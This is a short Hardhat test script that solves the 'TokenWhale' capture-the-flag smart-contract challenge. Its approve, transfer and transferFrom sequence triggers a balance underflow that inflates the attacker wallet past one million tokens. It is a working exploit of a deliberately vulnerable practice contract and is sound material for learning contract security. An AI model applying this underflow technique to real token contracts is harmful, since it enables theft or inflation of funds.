const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenWhaleChallenge", function () {
  // Test case to solve the Token Whale Challenge
  it("Solves the tokenWhale challenge", async () => {
    // Get the signer objects for two wallets (walletA and walletB)
    const [walletA, walletB] = await ethers.getSigners();

    // Get walletA's address
    const user1Address = await walletA.getAddress();
    // Create a contract factory for the TokenWhaleChallenge contract
    const challengeFactory = await ethers.getContractFactory(
      "TokenWhaleChallenge"
    );
    // Deploy the TokenWhaleChallenge contract with walletA's address
    const challengeContract = await challengeFactory.deploy(user1Address);
    // Wait for the contract deployment to complete
    await challengeContract.deployed();

    // WalletB approves walletA to spend 1,000 tokens on its behalf
    const approveTx = await challengeContract
      .connect(walletB)
      .approve(walletA.address, 1000);
    // Wait for the approval transaction to complete
    await approveTx.wait();

    // WalletA transfers 501 tokens to walletB
    const transferTx = await challengeContract
      .connect(walletA)
      .transfer(walletB.address, 501);
    // Wait for the transfer transaction to complete
    await transferTx.wait();

    // WalletA transfers 500 tokens from walletB to the zero address
    const transferFromTx = await challengeContract
      .connect(walletA)
      .transferFrom(
        walletB.address,
        "0x0000000000000000000000000000000000000000",
        500
      );
    // Wait for the transferFrom transaction to complete
    await transferFromTx.wait();

    // Check if the challenge is complete (walletA's balance is >= 1,000,000 tokens)
    expect(await challengeContract.isComplete()).to.be.true;
  });
});
